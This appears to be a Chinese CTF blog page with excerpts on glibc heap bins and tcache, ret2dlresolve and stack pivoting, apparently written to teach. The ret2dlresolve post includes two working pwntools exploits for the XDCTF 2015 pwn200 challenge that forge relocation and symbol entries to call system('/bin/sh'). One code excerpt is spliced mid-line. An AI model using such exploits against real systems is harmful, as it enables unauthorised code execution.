+<p>最后一个：只有一个chunk.大小和large bins剩下的大小一样。</p>
+<p>每个bin里的chunk大小都不一样。按大小降序。取chunk时也遵循best fit。要好好的合适</p>
+<h2 id="tcache-bin"><a href="#tcache-bin" class="headerlink" title="tcache bin"></a>tcache bin</h2><p> libc 2.26以后又引入了新的bin 。和fast bin类似，主要来提高效率和利用率。但安全性降低</p>
+<p> tcache（Thread-Local Cache）于 <strong>glibc 2.26</strong> 引入，用于加速同一线程内的小块内存分配和释放。</p>
+<p> tcache一共64个bin。每个 bin 最多缓存 <strong>7</strong> 个 freed chunk（由 LIFO 方式管理） </p>
+<p> 范围在 <strong>16–1024 字节</strong>（步长 16 字节）共 <strong>64</strong> 个 bin</p>
+<p> 内部通过单链表存储已释放的堆的<code>tcache_entry</code> 结构。</p>
+<p> 可通过 <strong>tcache poisoning</strong> 等方法利用。</p>
+<p> glibc <strong>2.29</strong> 起加入 <code>key</code> 字段以检测 double free，2.32更新版本又引入指针加密等缓解措施，</p>
+<h3 id="tcache-bin的分配"><a href="#tcache-bin的分配" class="headerlink" title="tcache bin的分配"></a>tcache bin的分配</h3><p> 在内存分配的 malloc 函数中有多处，会将内存块移入 tcache 中。tcache bin像个中转站一样</p>
+<p>（1）首先，申请的内存块符合 fastbin 大小时并且在 fastbin 内找到可用的空闲块时，会把该 fastbin 链上的其他内存块放入 tcache 中。</p>
+<p>（2）其次，申请的内存块符合 smallbin 大小时并且在 smallbin 内找到可用的空闲块时，会把该 smallbin 链上的其他内存块放入 tcache 中。</p>
+<p>（3）当在 unsorted bin 链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到 tcache 中，继续处理。</p>
+<h3 id="取出"><a href="#取出" class="headerlink" title="取出"></a>取出</h3><p>1.在内存申请的开始部分，首先会判断申请大小块，在 tcache 是否存在，如果存在就直接从 tcache 中摘取，否则再使用_int_malloc 分配。</p>
+<p>2.在循环处理 unsorted bin 内存块时，如果达到放入 unsorted bin 块最大数量，会立即返回。默认是 0，即不存在上限。</p>
+<ol start="3">
+<li>在循环处理 unsorted bin 内存块后，如果之前曾放入过 tcache 块，则会取出一个并返回。</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/#0x03-pwn-tcache">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/#0x03-pwn-tcache</a></p>
+<p>tcache利用起来比fast bin简单，只需要把next 覆盖掉就行</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530636018-ac739ed3-4641-4ddd-bf32-5745d7b2bca5.png"></p>
+<h2 id="内存分配流程-（看上比较复杂）"><a href="#内存分配流程-（看上比较复杂）" class="headerlink" title="内存分配流程 （看上比较复杂）"></a>内存分配流程 （看上比较复杂）</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530636014-63c12b18-1ceb-4c33-ba75-b0253fc297ec.png"></p>
+<h2 id="内存释放流程"><a href="#内存释放流程" class="headerlink" title="内存释放流程"></a>内存释放流程</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530636066-a7b42384-1587-40e5-b71e-5df7dbdffc28.png"></p>
+<h1 id="其它的"><a href="#其它的" class="headerlink" title="其它的"></a>其它的</h1><p>主线程可以使用brk和mmap来分配</p>
+<p>子线程只能用brk</p>
+<p>mmap是从shared libraries里面取的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530636536-d0b95e19-8da5-42fb-abf5-97f21a982c9a.png"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/pwn/" style="color: #ff7d73">pwn</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/heap/" style="color: #00bcd4">heap</a>
+        </span>
+        
+    </div>
+    <a href="/2025/06/25/%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88%E7%9A%84%E6%A6%82%E5%BF%B5%EF%BC%89/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/06/20/retdlresolve/">
+        <h2 class="post-title">ret2dlresolve 利用技术</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/6/20
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>当不能泄露libc时。我们可以通过retdlresolve这种方法来伪造动态链接器。控制程序的执行流程。</p>
+<p>主要是延迟绑定中的re_dlresolve函数</p>
+<p>在 <strong>Ret2dlresolve</strong> 攻击中，你的目的是让链接器帮你解析一个<strong>原本不存在于导入表中的函数</strong>（比如 <code>system</code>），或者你想劫持解析过程。因为 <code>.rel.plt</code> 没法写，所以你必须：</p>
+<ol>
+<li>在可写的区域（如 BSS 段）<strong>伪造</strong>一个重定位表项（即 <code>fake_reloc</code>）。</li>
+<li>告诉链接器去这里读数据，而不是去正常的 <code>.rel.plt</code> 读。</li>
+<li>我们需要构造出完整的流程</li>
+</ol>
+<blockquote>
+<p>延迟绑定：当程序第一次调用一个动态链接的函数时，会通过 PLT (Procedure Linkage Table) 和 GOT (Global Offset Table) 来完成函数地址的解析。这个过程涉及到 _dl_runtime_resolve 函数的调用。</p>
+</blockquote>
+<ol>
+<li><strong>_dl_fixup 函数</strong>：_<em>dl_runtime_resolve</em> 实际上调用了 _<em>dl_fixup</em> 函数，该函数在 glibc 中实现，用于解析符号并更新 GOT 表。</li>
+<li><strong>RELRO 类型</strong>：根据程序的 RELRO (Relocation Read-Only) 类型，攻击者需要采取不同的策略。NO RELRO 时，<em>.dynamic</em> 节是可写的，可以直接修改；Partial RELRO 时，<em>.dynamic</em> 节是只读的，但 <em>.rel.plt</em> 节是可写的，需要通过栈迁移等技术来伪造数据结构。</li>
+<li><strong>攻击实践</strong>：攻击者需要伪造 <em>.rel.plt</em>、<em>.dynsym</em> 和 <em>.dynstr</em> 节中的数据结构，然后通过控制 <em>reloc_arg</em> 和 <em>link_map</em> 来调用 _<em>dl_runtime_resolve</em> 函数，最终实现调用 <em>system(“&#x2F;bin&#x2F;sh”)</em> 来获取 shell。</li>
+</ol>
+<p><strong>.rel.plt</strong>节是用于函数重定位，<strong>.rel.dyn</strong>是用于变量重定位</p>
+<h2 id="dl-fixup函数"><a href="#dl-fixup函数" class="headerlink" title="_dl_fixup函数"></a>_dl_fixup函数</h2><p>传入的两个参数。一个是rdi寄存器中存储的link_map，rsi是GOT表中关于PLT重定位的索引值，后面要根据该索引值写入新的地址。</p>
+<p>就是用于解析导入函数的真实地址，并改写GOT</p>
+<p>“<strong>当程序导入函数时，动态链接器在</strong><code>**.dynstr**</code><strong>段中添加一个函数名称字符串</strong><br><strong>在</strong><code>**.dynsym**</code><strong>段中添加一个指向函数名称字符串的</strong><code>**Elf Sym**</code><strong>结构体</strong><br><strong>在</strong><code>**.rel.plt**</code><strong>段中添加一个指向</strong><code>**Elf Sym**</code><strong>的</strong><code>**Elf Rel**</code><strong>结构体</strong><br><strong>最后</strong><code>**Elf Rel**</code><strong>的</strong><code>**r_offse**</code><strong>构成GOT表，保存在</strong><code>**.got.plt**</code><strong>段中</strong>“</p>
+<h2 id="重定位rel表"><a href="#重定位rel表" class="headerlink" title="重定位rel表"></a>重定位rel表</h2><p> 动态链接器的“待办事项清单”，它告诉链接器：“请算出某某函数的真实地址，然后填到某某地方去”。  </p>
+<ol>
+<li><code>**r_info**</code> 是一个<strong>压缩数据</strong>。在 32 位 ELF 中，为了节省空间，它把“找哪个符号”和“怎么处理”这两个信息，压到了同一个 32 位整数里。所以它有两部分<ul>
+<li><strong>高 24 位</strong>：存放符号表索引 (<code>r_sym</code>)。</li>
+<li><strong>低 8 位</strong>：存放重定位类型 (<code>r_type</code>)。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="1-什么是-Rel-表-rel-plt-？"><a href="#1-什么是-Rel-表-rel-plt-？" class="headerlink" title="1. 什么是 Rel 表 (.rel.plt)？"></a>1. 什么是 Rel 表 (<code>.rel.plt</code>)？</h3><p>在程序编译时，编译器不知道 <code>system</code>、<code>read</code> 这些动态库函数的真实地址（因为它们在 libc.so 里，且地址随机）。</p>
+<p>所以，编译器在程序里留了一张表，叫做 <strong>重定位表 (</strong><code>**Elf32_Rel**</code><strong>)</strong>。这就好比是一张<strong>填空题试卷</strong>：</p>
+<ul>
+<li><strong>题目 1</strong>：请计算 <code>read</code> 函数的真实地址，填入 <code>0x804a010</code> (read_got)。</li>
+<li><strong>题目 2</strong>：请计算 <code>write</code> 函数的真实地址，填入 <code>0x804a014</code> (write_got)。</li>
+</ul>
+<p>动态链接器 (<code>_dl_runtime_resolve</code>) 运行时的核心工作就是：<strong>读取这张表，做完题目，填好空。</strong></p>
+<p>这张表里的每一项（每一道题）结构如下：</p>
+<pre><code class="language-c">typedef struct &#123;
+    Elf32_Addr r_offset;  // 填空的位置 (比如 write_got 的地址)
+    Elf32_Word r_info;    // 题目信息 (包含：找谁？怎么填？)
+&#125; Elf32_Rel;
+</code></pre>
+<hr>
+<h3 id="2-r-info-的位操作"><a href="#2-r-info-的位操作" class="headerlink" title="2. r_info 的位操作"></a>2. <code>r_info</code> 的位操作</h3><p>r_info 是一个 Elf32_Word (32位无符号整数，4字节)。它的高24位和低八位又再分</p>
+<p>分别为r_sym和r_type</p>
+<p>它虽然只是一个整数，但 ELF 规范 (Specification) 规定了它的比特位分布：</p>
+<table>
+<thead>
+<tr>
+<th><strong>Bit 31 …………………… Bit 8</strong></th>
+<th><strong>Bit 7 ………. Bit 0</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>ELF32_R_SYM (符号索引)</strong></td>
+<td><strong>ELF32_R_TYPE (类型)</strong></td>
+</tr>
+<tr>
+<td><strong>高 24 位</strong></td>
+<td><strong>低 8 位</strong></td>
+</tr>
+</tbody></table>
+<h4 id="为什么要这么分？"><a href="#为什么要这么分？" class="headerlink" title="为什么要这么分？"></a>为什么要这么分？</h4><ul>
+<li><code>**r_type**</code>：重定位类型（比如 <code>R_386_JUMP_SLOT</code> 固定是 <code>0x7</code>）。它只需要很少的几种类型，<strong>8 个比特</strong> (0-255) 足够了。</li>
+<li><code>**r_sym**</code>：符号表索引。一个程序可能会导入成千上万个函数，所以需要更大的空间，<strong>24 个比特</strong> (可以支持 1600万个符号) 留给它。</li>
+</ul>
+<p>然后我们如果要伪造对应的rel表。对应这一块要把r_sym、r_type、r_offset设置成要换的函数</p>
+<p>r_info通过拼接得到。</p>
+<p>然后有了rel表以后我们介绍ELF符号表</p>
+<h2 id="ELF表和sym结构体"><a href="#ELF表和sym结构体" class="headerlink" title="ELF表和sym结构体"></a>ELF表和sym结构体</h2><p>ELF符号表好像有很多东西。不过32位的时候我们只需要伪造里面的sym结构体（ELF32_sym）就行</p>
+<p>简单来说，<code>**Sym**</code>** 表就是函数的“身份证”**。 链接器拿到 <code>Rel</code> 表（工单）后，会根据索引找到这张 <code>Sym</code> 表（身份证），通过身份证上的信息确认：“哦，原来你要找的函数叫 <code>system</code>，它是个全局函数。”</p>
+<hr>
+<h3 id="1-Elf32-Sym-结构体标准定义-16字节"><a href="#1-Elf32-Sym-结构体标准定义-16字节" class="headerlink" title="1. Elf32_Sym 结构体标准定义 (16字节)"></a>1. <code>Elf32_Sym</code> 结构体标准定义 (16字节)</h3><p>在 C 语言中，它的定义是这样的：</p>
+<pre><code class="language-c">typedef struct &#123;
+    Elf32_Word    st_name;  // 4字节: 名字在哪里？(字符串表的偏移)
+    Elf32_Addr    st_value; // 4字节: 函数地址 (导入函数填0)
+    Elf32_Word    st_size;  // 4字节: 函数大小 (导入函数填0)
+    unsigned char st_info;  // 1字节: 属性 (类型+绑定)
+    unsigned char st_other; // 1字节: 可见性 (0)
+    Elf32_Half    st_shndx; // 2字节: 归属段 (0)
+&#125; Elf32_Sym;
+</code></pre>
+<h3 id="下面介绍st-name-的具体工作原理"><a href="#下面介绍st-name-的具体工作原理" class="headerlink" title="下面介绍st_name 的具体工作原理"></a>下面介绍<code>st_name</code> 的具体工作原理</h3><p>   可以了解一下偶然看到的</p>
+<p>   ELF 文件为了节省空间，不会把函数名（如 <code>&quot;system&quot;</code>, <code>&quot;printf&quot;</code>, <code>&quot;write&quot;</code>）直接写在 Symbol 结构体里。相反，它把所有字符串连在一起，放在一个叫 <code>**.dynstr**</code>** (Dynamic String Table)** 的区域里。</p>
+<p><code>**st_name**</code>** 存的就是相对于 <strong><code>**.dynstr**</code></strong> 起始地址的偏移量。**</p>
+<hr>
+<p><strong>ok那么我们伪造了一个</strong> sym结构体的话，如果你想让它里面代表 <code>**write**</code> 函数：</p>
+<p>对于st_name就应该</p>
+<ol>
+<li><strong>你需要算出 <strong><code>**&quot;write&quot;**</code></strong> 字符串相对于 <strong><code>**.dynstr**</code></strong> 开头的距离。</strong></li>
+<li><strong>距离 &#x3D; <strong><code>**0x08048206**</code></strong> - <strong><code>**0x08048200**</code></strong> &#x3D; <strong><code>**6**</code></strong>。</strong></li>
+<li><strong>所以，你的 <strong><code>**fake_sym.st_name**</code></strong> 必须填入 <strong><code>**6**</code></strong>。</strong></li>
+</ol>
+<p><strong>链接器看到 <strong><code>**st_name = 6**</code></strong>，就会做如下计算：</strong></p>
+<p>**函数名地址 &#x3D; **<code>**.dynstr**</code><strong>基地址 + <strong><code>**6**</code></strong> &#x3D; 指向 “write”</strong></p>
+<h3 id="st-value-st-size（值与大小）"><a href="#st-value-st-size（值与大小）" class="headerlink" title="st_value  st_size（值与大小）"></a>st_value  st_size（值与大小）</h3><h4 id="st-value"><a href="#st-value" class="headerlink" title="st_value"></a>st_value</h4><ul>
+<li><strong>类型</strong>：<code>Elf32_Addr</code> (地址)</li>
+</ul>
+<p><strong>标准含义</strong>：</p>
+<ul>
+<li><strong>如果是已定义的函数</strong>：这里存的是函数在内存中的<strong>虚拟地址</strong>（或者在文件中的偏移）。</li>
+<li><strong>如果是未定义的函数（导入函数）</strong>：这里通常为 <strong>0</strong>。</li>
+</ul>
+<p><strong>在攻击中的设置</strong>：<code>**0**</code></p>
+<ul>
+<li><strong>原因</strong>：我们伪造这个符号是为了让链接器去 libc 里找 <code>system</code>，而不是我们在程序里自己写了一个 <code>system</code>。既然是“去外面找”，那我们手头就没有它的地址，留空（0）即可。链接器解析完成后，会把找到的真地址填到 GOT 表里，而不是改写这里。</li>
+</ul>
+<h4 id="st-size"><a href="#st-size" class="headerlink" title="st_size"></a>st_size</h4><ul>
+<li><strong>类型</strong>：<code>Elf32_Word</code> (整数)</li>
+</ul>
+<p>**  标准含义**：</p>
+<ul>
+<li>该符号占用多少字节的内存。比如一个函数有 100 行汇编，可能大小就是 200 字节。</li>
+<li><strong>在攻击中的设置</strong>：<code>**0**</code></li>
+<li><strong>原因</strong>：动态链接器在解析函数地址时，只关心“函数在哪里（起始地址）”，根本不关心“函数有多长”。填 0 是最省事且安全的做法。</li>
+</ul>
+<pre><code class="language-python">p32(0) + p32(0)
+</code></pre>
+<h2 id="st-info"><a href="#st-info" class="headerlink" title="st_info"></a>st_info</h2><p>与我们的重定位表类似。这里它也有两部分</p>
+<pre><code class="language-c">st_bind = 0x1
+st_type = 0x2
+st_info = (st_bind r_info)];
+
+    void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);
+    lookup_t result;
+    DL_FIXUP_VALUE_TYPE value;
+
+    // 检查r_info的最低位是不是7
+    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); 
+
+    // 这里是一层检测，检查sym结构体中的st_other是否为0，正常情况下为0，执行下面代码
+    if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) 
+    &#123;
+        const struct r_found_version *version = NULL;
+
+        // 这里也是一层检测，检查link_map中的DT_VERSYM是否为NULL，正常情况下不为NULL，执行下面代码
+        if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)
+        &#123;
+            /* 到了这里就是64位下报错的位置，在计算版本号时，vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff的过程中，
+			由于我们一般伪造的symtab位于bss段，就导致在64位下reloc-&gt;r_info比较大,故程序会发生错误。所以要使程序不发生错误，
+			自然想到的办法就是不执行这里的代码，分析上面的代码我们就可以得到两种手段：
+
+			第一种手段就是使上一行的if不成立，也就是设置link_map中的DT_VERSYM为NULL，那我们就要泄露出link_map的地址，而如果我们能泄露地址，根本用不着ret2dlresolve。
+			第二种手段就是使最外层的if不成立，也就是使sym结构体中的st_other不为0，直接跳到后面的else语句执行。*/
+            const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
+            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;
+            version = &amp;l-&gt;l_versions[ndx];
+            if (version-&gt;hash == 0)
+                version = NULL;
+        &#125;
+
+        int flags = DL_LOOKUP_ADD_DEPENDENCY;
+        if (!RTLD_SINGLE_THREAD_P)
+        &#123;
+            THREAD_GSCOPE_SET_FLAG ();
+            flags |= DL_LOOKUP_GSCOPE_LOCK;
+        &#125;
+
+        RTLD_ENABLE_FOREIGN_CALL;
+
+        // 在32位情况下，上面代码运行中不会出错，就会走到这里，这里通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址
+        result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,
+                                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);
+
+        if (!RTLD_SINGLE_THREAD_P)
+            THREAD_GSCOPE_RESET_FLAG ();
+
+        RTLD_FINALIZE_FOREIGN_CALL;
+
+        // 同样，如果正常执行，接下来会来到这里，得到value的值，为libc基址加上要解析函数的偏移地址，也即实际地址，即result+st_value
+        value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0);
+    &#125;
+    else
+    &#123;
+        // 这里就是64位下利用的关键，在最上面的if不成立后，就会来到这里,这里value的计算方式是 l-&gt;l_addr + st_value,我们的目的是使**value为我们所需要的函数的地址，所以就得控制两个参数，l_addr 和 st_value
+        /* We already found the symbol.  The module (and therefore its load
+     address) is also known.  */
+        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);
+        result = l;
+    &#125;
+
+    /* And now perhaps the relocation addend.  */
+    value = elf_machine_plt_value (l, reloc, value);
+
+    if (sym != NULL
+      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))
+        value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));
+
+    /* Finally, fix up the plt itself.  */
+    if (__glibc_unlikely (GLRO(dl_bind_not)))
+    return value;
+  // 最后把value写入相应的GOT表条目中
+  return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
+&#125;
+</code></pre>
+<h1 id="XDCTF-2015-pwn200（32位）"><a href="#XDCTF-2015-pwn200（32位）" class="headerlink" title="XDCTF 2015 pwn200（32位）"></a>XDCTF 2015 pwn200（32位）</h1><p>这道题用了偷梁换柱的方法。原来要解析write函数。我们换成system</p>
+<pre><code class="language-python">from pwn import *
+
+# context.log_level = &#39;debug&#39;
+
+elf = ELF(&#39;./pwn200&#39;)
+# io = remote(&#39;127.0.0.1&#39;, 10001)
+io = process(&#39;./pwn200&#39;)
+io.recv()
+
+pppr_addr      = 0x08048619     # pop esi ; pop edi ; pop ebp ; ret
+pop_ebp_addr   = 0x0804861b     # pop ebp ; ret
+leave_ret_addr = 0x08048458 #: leave ; ret
+
+write_plt = elf.plt[&#39;write&#39;]
+write_got = elf.got[&#39;write&#39;]
+read_plt  = elf.plt[&#39;read&#39;]
+
+plt_0    = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addr        # 0x80483e0
+rel_plt  = elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addr    # 0x8048390
+dynsym   = elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addr     # 0x80481cc
+dynstr   = elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr     # 0x804828c
+bss_addr = elf.get_section_by_name(&#39;.bss&#39;).header.sh_addr        # 0x804a028
+
+base_addr = bss_addr + 0x600   
+
+payload_1  = b&quot;A&quot; * 112
+payload_1 += p32(read_plt)
+payload_1 += p32(pppr_addr)
+payload_1 += p32(0)
+payload_1 += p32(base_addr)
+payload_1 += p32(100)
+payload_1 += p32(pop_ebp_addr)
+payload_1 += p32(base_addr)
+payload_1 += p32(leave_ret_addr)
+io.send(payload_1)
+&#39;&#39;&#39;
+上面是在打开一些需要用的地址。然后分配好在bss上迁移的空间。利用程序里的溢出把控制流弄到bss
+进行栈迁移。在bss上伪造我们的表
+&#39;&#39;&#39;
+
+reloc_index = base_addr + 28 - rel_plt      
+#我们这里计算地址的时候也是用的基准+偏移的方式。＋0x28在下面的payload里
+
+fake_sym_addr = base_addr + 36
+
+align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)
+fake_sym_addr = fake_sym_addr + align       # 对齐
+
+# fake Elf Rel
+r_sym = (fake_sym_addr - dynsym) / 0x10
+r_type = 0x7
+r_info = (int(r_sym) &lt;&lt; 8) + (r_type &amp; 0xff)
+fake_reloc = p32(write_got) + p32(r_info)
+
+# fake Elf Sym
+st_name = fake_sym_addr + 0x10 - dynstr
+st_bind = 0x1
+st_type = 0x2
+st_info = (st_bind &lt;&lt; 4) + (st_type &amp; 0xf)
+fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)
+
+payload_7 = b&quot;AAAA&quot;                  #0x4
+payload_7 += p32(plt_0)              #0x8
+payload_7 += p32(reloc_index)        #0x12
+payload_7 += b&quot;AAAA&quot;                 #0x16
+payload_7 += p32(base_addr + 80)     #0x20
+payload_7 += b&quot;AAAA&quot;                 #0x24
+payload_7 += b&quot;AAAA&quot;                 #0x28
+payload_7 += fake_reloc
+payload_7 += b&quot;A&quot; * align
+payload_7 += fake_sym
+payload_7 += b&quot;system\x00&quot;
+payload_7 += b&quot;A&quot; * (80 - len(payload_7))
+payload_7 += b&quot;/bin/sh\x00&quot;
+payload_7 += b&quot;A&quot; * (100 - len(payload_7))
+io.sendline(payload_7)
+io.interactive()
+</code></pre>
+<p>自动化构造：</p>
+<pre><code class="language-python">from pwn import *
+
+context.binary = elf = ELF(&quot;./pwn200&quot;)
+context.arch=&#39;i386&#39;
+context.log_level =&#39;debug&#39;
+
+rop = ROP(context.binary)
+
+dlresolve = Ret2dlresolvePayload(elf,symbol=&quot;system&quot;,args=[&quot;/bin/sh&quot;])
+rop.read(0,dlresolve.data_addr)
+rop.ret2dlresolve(dlresolve)
+raw_rop = rop.chain()
+io = process(&quot;./pwn200&quot;)
+io.recvuntil(&quot;\n&quot;)
+payload = flat(&#123;112:raw_rop,256:dlresolve.payload&#125;)
+io.sendline(payload)
+io.interactive()
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/pwn/" style="color: #ffa2c4">pwn</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/ret2dlresolve/" style="color: #03a9f4">ret2dlresolve</a>
+        </span>
+        
+    </div>
+    <a href="/2025/06/20/retdlresolve/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/06/15/%E6%A0%88%E8%BF%81%E7%A7%BB/">
+        <h2 class="post-title">栈迁移技术详解</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/6/15
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>栈迁移<br>存在栈溢出漏洞，并且不够写后续的ROP或者其它东西的时候就可以用。可以迁移到栈上和bss段<br>就像这样它剩下的16是肯定不够写接下来的ROP链的，但是刚好够写leave ret。</p>
+<p>这个也比较典型<br>栈迁移核心就在要把ebp(rbp)覆盖成我们想要迁过去的地址。然后返回地址覆盖成leave ret</p>
+<p>然后需要我们：<br>1、要能够栈溢出，这点尤其重要，最起码也要溢出覆盖个ebp<br>2、你要有个可写的地方（就是要GetShell的地方），先考虑bss段，bss段固定最后再考虑写到栈中<br>我们能写的就这几个:栈区、堆区、bss、.data<br>那先我们考虑bss和.data段。迁移到栈还是bss。题目应该都会准备好或者有暗示。然后我们为什么不迁移到data段呢，因为data段离got表太近了，可能把它就改了。一般我们迁移不到栈的话先迁到bss段。<br>先说一下比较重要的一件事。leave;ret 指令<br>leave指令即为mov esp,ebp;pop ebp先将ebp赋给esp，此时esp与ebp位于了一个地址，你可以现在把它们指向的那个地址，即当成栈顶又可以当成是栈底。然后pop ebp，将栈顶的内容弹入ebp（此时栈顶的内容也就是ebp的内容，也就是说现在把ebp的内容赋给了ebp）。因为esp要时刻指向栈顶，既然栈顶的内容都弹走了，那么esp自然要往下挪一个内存单元。(64位换成对应的寄存器就行)<br>就是将 ebp 赋值给 esp ，并弹出 ebp 。<br>ret指令为pop eip，这个指令就是把栈顶的内容弹进了eip<br>这是leave 的两步</p>
+<p>ret</p>
+<p>查找的命令<br>ok,那么常规思路下面我们一般是这么做的。迁移之后我们就需要在迁移到的bss或者栈上布置rop了<br>常用序列：<br>总结一下就是<br>pop rbp 把 target_addr 写入 rbp；leave 做 mov rsp, rbp; pop rbp（会从 target_addr 弹出一个值到rbp），随后 ret 会从新的 rsp 弹出返回地址并跳转 —— 因此你必须在 target_addr 布置好第一项（给 leave 的 pop rbp）和第二项（给 ret 的返回地址）。<br>一般是<br>就是这两个阶段<br>1.第一阶段有限空间内写入一个能覆盖返回地址的payload，这个 payload 含有：把 .bss地址放到某寄存器&#x2F;栈上并触发栈 pivot 的 gadget（就比如前面了解到的  leave; ret）。<br>2.执行 pivot 后，rsp 指向 .bss（你预先写好的“假栈”），程序从那里继续执行完整的 ROP 链或调用 mprotect&#x2F;mmap 来获得可执行内存后执行 shellcode。<br>注意<br>如果有地址随机化的话，那需要先泄露地址。计算好要迁移的位置<br>NX：.bss 默认不可执行；若你想在假栈上直接执行 shellcode，需先用 ROP 调 用mprotect。让它shellcode能执行<br>写入假栈：必须有手段把第二阶段 payload 写入到那个假栈地址（例如用连续的读操作、puts&#x2F;read&#x2F;recv 写入，或者利用程序的全局缓冲区）。<br>栈迁移是一种技术手段。它可以让你在空间不够用的时候继续增加空间。有的题目可能迁移两三次。<br>这样的就比较麻烦了。不过这样的话写起来的格式就跟第一次迁移的差不多。除了leave ret ;这个gadget,还有<br>迁移两次一般就是第一次泄露libc,第二次再getshell<br>这里举一个小小的例子。参考ctf-SkYe Wiki上的i春秋新春战役 borrowstack<br>原程序：<br>第一次迁移<br>第一次栈迁移需要向 bank+0x90 写入需要执行的代码。这道题是利用的是第二次 read 输入 stack 1 数据。需要进行两次迁移的话，在输入 stack 1 数据就要考虑第二次栈迁移的地址，可以选择 bank+0x60 。<br>在  stack1 需要泄露出 libc 基地址，写入stack 2 数据。泄露地址就选择一个函数真实地址输出并计算偏移，然后调用 main 函数中的 read2 写入 stack 2 ，因为顺序执行，因此还执行了一次 leave （即 main 函数从 read2 开始运行一遍），触发第二次栈迁移。<br>1准备完成，并且为  2 预留写入函数，接下来就是处理并写入 2 。因为这个栈已经是最后一个栈，所以不需要关心 ebp 的值。随便赋一个值就行<br>如果遇到有的题目需要3 次、 4 次等多次迁移，就将 ebp 赋值为下一次迁移的地址，直到最后一次。<br>3次可参考此篇栈迁移：三种利用方法-CSDN博客。里面还用了一个read 的leave  gadget 来做</p>
+<p>其它间接迁移的gadget<br>比如<br>需要提前设置rax。xchg换成mov也可以<br>相对移动作用有限<br>基本上leave ret用的还是比较多<br>看两道题，一个是栈上的。一个是bss段的<br>迁移到栈上</p>
+<p>这个题没有后门要构造rop。覆盖rbp以后再覆盖返回地址就只剩0x10.不够rop<br>这个时候考虑栈迁移。因为题目里给的比较明显第一次read以后再来一次read。那就是迁到第二次那继续ROP<br>找到rbp地址来确定栈的地址。<br>栈的地址确定就可以确定旧rbp。vuln，新rbp。main<br>基本上没有保护<br>先格式化泄露rbp.知道了栈基址。通过gdb可以看到新栈和旧栈之间距离<br>地址找好以后迁移完就是rop。刚开始做的栈溢出。没有载荷要发送bin&#x2F;sh.<br>找到确定偏移就可以了<br>迁移到bss<br>iscc的最后一轮的第一道题</p>
